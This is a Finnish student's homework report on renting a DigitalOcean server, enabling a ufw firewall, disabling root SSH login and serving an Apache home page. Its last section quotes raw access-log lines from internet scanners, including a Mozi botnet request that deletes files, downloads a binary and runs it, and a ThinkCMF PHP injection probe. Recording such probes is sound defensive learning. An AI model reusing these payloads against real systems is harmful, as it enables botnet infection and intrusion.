# h4 - Oikea palvelin oikeaan nettiin
####  Tekijä: Daniel Tarsalainen 

\
&nbsp;


## Tehtävänanto


- [x] a) Vuokraa oma julkinen palvelin Internetiin. Vinkkejä: Perustele tehdyt valinnat. Voit saada myös ilmaiseksi Github Education -paketilla. Jos sinulla on aiempi palvelin, tee uusi alusta lähtien ja raportoi samalla. Käytä aina hyviä salasanoja.
- [x] b) Suojaa palvelin tulimuurilla. Muista ensin reikä ssh-palvelimelle.
- [x] c) Laita koneellesi Apache-weppipalvelin. Korvaa testisivu. Laita käyttäjän kotisivut toimimaan. Kokeile eri koneelta, esim. kännykällä, että sivut toimivat. Vinkki: tee kotisivut normaalina käyttäjänä public_html/ alle, opettelemme "name based virtual hosting" myöhemmin.
- [ ] d) Etsi lokeistasi merkkejä murtautumisyrityksistä ja analysoi ne. Vinkki: auth.log.



\
&nbsp;



#### a) Vuokraa oma julkinen palvelin Internetiin. Vinkkejä: Perustele tehdyt valinnat. Voit saada myös ilmaiseksi Github Education -paketilla. Jos sinulla on aiempi palvelin, tee uusi alusta lähtien ja raportoi samalla. Käytä aina hyviä salasanoja.*

*Lähdin vuokramaan palvelinta DigitalOceanista, koska sitä suositeltiin oppitunnilla. Sain Github Education -paketilla 200 dollaria käytettäväksi kahden kuukauden ajaksi. Lähdin luomaan uutta julkista palvelinta "Create a droplet" -kohdasta. Napinpainalluksen jälkeen ilmestyi alla näkyvä sivu, josta valitsin Debian 10:nen palvelimen käyttöjärjestelmäksi. Seuraavaksi valitsin tavallisen suunnitelman, johon sisältyi tavallinen Intel prosessori SSD:n kanssa.*

![image](https://user-images.githubusercontent.com/77921212/133623762-26ad3845-e05c-4c10-ba18-40bb1e60f51a.png)

*Seuraavaksi tuli valita alue, joista valitsin Amsterdamin.*

![image](https://user-images.githubusercontent.com/77921212/133624676-dee3a1b3-9a7b-4e1e-9dc3-fb4b71defe21.png)

*Tämän jälkeen lähdin valitsemaan salasanaa. Tein siitä mahdollisimman monimutkaisen, jotta tunkeutumisuhka on mahdollisimman pieni. Lopuksi tuli valita palvelimen "hostname", jonka myös tein kryptiseksi turvallisuussyistä. Tämän jälkeen painoin jälleen "Create a droplet" -nappia, jolloin pääsin poimimaan palvelimen ip-osoitteen.*

*Sitten vuorossa oli palvelimelle kirjautuminen komentoriviltä käsin.*

\
&nbsp;

#### b) Suojaa palvelin tulimuurilla. Muista ensin reikä ssh-palvelimelle.*

*Hyödynsin (https://terokarvinen.com/2017/first-steps-on-a-new-virtual-private-server-an-example-on-digitalocean/?fromSearch=digital) sivulla näkyviä ohjeita. Kirjauduin palvelimelle sisään rootilla komennolla `ssh root @178.128.245.233`. Ip-osoitteen syöttämisen jälkeen tuli varmistusviesti (yes or no).*

![image](https://user-images.githubusercontent.com/77921212/133629666-ab139c92-d499-4070-bf65-083af6a3f9fb.png)


*Sitten pyydettiin palvelimen salasanaa. Sen jälkeen kun syötin salasanan oikein, päivitin saatavilla olevat paketit `sudo apt-get update` -komennolla. Tämän jälkeen annoin `sudo apt-get upgrade` -komennon, jolla päivitin kaikki paketit. `sudo apt-get install ufw`-komennolla asensin tulimuurin. `sudo ufw allow 22/tcp` -komennolla tein reiän SSH:n ja komennolla `sudo ufw enable` otin palomuurin käyttöön. Tämän jälkeen loin palvelimelle uuden käyttäjän nimellä "leinad".*

*Käyttähän luonnin jälkeen kirjauduin palvelimelle `leinad@178.128.245.233` -komennolla, jolla pääsin suoraan juuri luodulle käyttäjälle. Sitten käytin `sudo usermod --lock root`, komentoa jolla sain aikaan sen, että rootin salasana lukittui.*

![image](https://user-images.githubusercontent.com/77921212/133632029-7b36f8c9-e5e6-4eac-af69-0fe42c8fff99.png)


*Tämän jälkeen `/etc/ssh/sshd_config` -tiedostossa muutin asetuksia, siten, että rootilla kirjautuminen ei ole lainkaan mahdollista. Config-tiedostoon pääsin `sudo sudoedit` komennolla. Tiedoston sisällä muutin "PermitRootLogin" asetuksen kielteiseksi. En ollut aiemmin käyttänyt kyseistä editoria, joten minun täytyi apuvalikosta löytää tallennus- ja poistumiskomento. Selvisi, että tallennus ja poistuminen tapahtuu näppäinyhdistelmällä `CTRL K X`. Lopuksi käynnistin palvelimen uudelleen `sudo service ssh restart` -komennolla.*

![image](https://user-images.githubusercontent.com/77921212/133631165-33400423-2fe9-4848-876a-6851ef6a4b81.png)


\
&nbsp;


#### c) Laita koneellesi Apache-weppipalvelin. Korvaa testisivu. Laita käyttäjän kotisivut toimimaan. Kokeile eri koneelta, esim. kännykällä, että sivut toimivat. Vinkki: tee kotisivut normaalina käyttäjänä public_html/ alle, opettelemme "name based virtual hosting" myöhemmin.

*Seuraavana agendassa oli Apache palvelimen asennus, jotta juuri luodun yksityisen DigitalOcean -palvelimen käyttö olisi mahdollista. Ennen asennusta tein `sudo apt-get update komennon`, jolla päivitin saatavilla olevat paketit. Tämän jälkeen asensin apache2 -palvelimen `sudo apt-get install apache2` -komennolla. Vielä tarvitsi tehdä reikä tulimuuriin, jotta sivulle pääsy olisi mahdollista. Tämä operaatio tehtiin komennolla `sudo ufw allow 80/tcp`.  Lopuksi käynnistin apache2 -palvelimen `sudo systemctl start apache2 -komennolla` ja päivitin sen `sudo systemctl reload apache2`. Apachen oletussivu tuli onnistuneesti näkyviin. Alla kuva kyseisestä tapahtumasta.*

![image](https://user-images.githubusercontent.com/77921212/133633620-31cd586b-1470-4876-b488-0be12b4c19a8.png)

*Tämän jälkeen lähdin muuttamaan Apache2 oletussivun omaksi nettisivukseni. Tein viimeviikon "m)" -kohdan tapaan kopion `etc/apache2/sites-available` -kansion `000-default.conf` tiedostosta ja asetin kopion nimeksi `leinadsite.conf`. Viime viikon tapaan lisäsin ServerName ja ServerALias -kohdat, ja niihin kumpaankin palvelimneni IP-osoitteen. DocumentRoot -kohtaan laitoin jo valmiiksi kohta tekemäni public_html kansion "leinad" -käyttäjän kotihakemistoon. Directory kohtaan asetin äsken mainititun hakemiston ja sen sisälle "Require all granted" asetuksen, joka mahdollistaa palvelimen pääsyn "public_html" -hakemistoon.*

![image](https://user-images.githubusercontent.com/77921212/133633857-23368a9c-2e95-4fea-b57b-46eff3cdc56a.png)

*Tämän jälkeen otin uudet configuraatiot käyttöön `sudo a2ensite leinadsite.conf` -komennolla. Sitten käynnistin apache2 palvelimen uudestaan `sudo systemctl start apache2` -komennolla, jonka jälkeen päivitin palvelimen `sudo systemctl reload apache2 -komennolla`, jotta aseutukset tulisivat varmasti voimaaan.*

*Lopuksi tein omaan kotihakemistoon uuden kansion nimeltä "public_html" ja loin sinne tiedoston nimellä "index.html". Tiedoston sisään kirjotin tekstin "Palvelin toimii juhuu!"*

![image](https://user-images.githubusercontent.com/77921212/133822839-6bb027d8-2342-4177-aedb-76a73e8059ce.png)

*Onnistuin pääsemään myös puhelimella palvelimelle*

![kuva](https://user-images.githubusercontent.com/77921212/133823774-aaba2233-f917-448d-89ed-e776bb773ee8.png)


\
&nbsp;


#### *d) Etsi lokeistasi merkkejä murtautumisyrityksistä ja analysoi ne. Vinkki: auth.log.*

> 172.104.131.24 - - [17/Sep/2021:07:51:22 +0000] "ABCDEFGHIJKLMNOPQRSTUVWXYZ9999" 400 0 "-" "-"

> 61.219.11.151 - - [17/Sep/2021:04:00:04 +0000] "dN\x93\xb9\xe6\xbcl\xb6\x92\x84:\xd7\x03\xf1N\xb9\xc5;\x90\xc2\xc6\xba\xe1I-\"\xdds\xba\x1fgC:\xb1\xa7\x80+" 400 0 "-" "-"

> 45.146.164.110 - - [17/Sep/2021:04:57:59 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 269 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"

> 120.86.237.41 - - [16/Sep/2021:13:27:39 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 494 "-" "Hello, world"

> 217.112.83.246 - - [17/Sep/2021:07:59:29 +0000] "POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1" 404 438 "-" "python-requests/2.18.4"

> 39.103.150.70 - - [16/Sep/2021:17:07:33 +0000] "GET /robots.txt HTTP/1.1" 404 438 "-" "fasthttp"






Lähteet:

- https://ipinfo.io/AS7713/180.252.0.0/16-180.252.248.0/23
- Censys: https://techcrunch.com/2020/08/05/censys-internet-device-search-series-a/?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS91cmw_c2E9dCZyY3Q9aiZxPSZlc3JjPXMmc291cmNlPXdlYiZjZD0mdmVkPTJhaFVLRXdpWjVjak12b2J6QWhVNkNSQUlIYmtCQ2w4UUZub0VDQjRRQVEmdXJsPWh0dHBzJTNBJTJGJTJGdGVjaGNydW5jaC5jb20lMkYyMDIwJTJGMDglMkYwNSUyRmNlbnN5cy1pbnRlcm5ldC1kZXZpY2Utc2VhcmNoLXNlcmllcy1hJTJGJnVzZz1BT3ZWYXczNmhTVDNyVFZoLXhNcldHNXl1RkxX&guce_referrer_sig=AQAAADBEvZ_FF0n92J5gOo2mrGYTm1VR1DEVNeN_vbkMc-p9hWagfhZgO8x_k7zq1I9px7afdexYv7ZwWzPXdrl8qZZD8uqc_Z98oTHHcnLR6NnxvsAiB1dgHoJE0j4lOVzeLJbUPsoR8-qKPxgOgA7Nt-hlK6Xk9xuDTQabWj1dnQQL

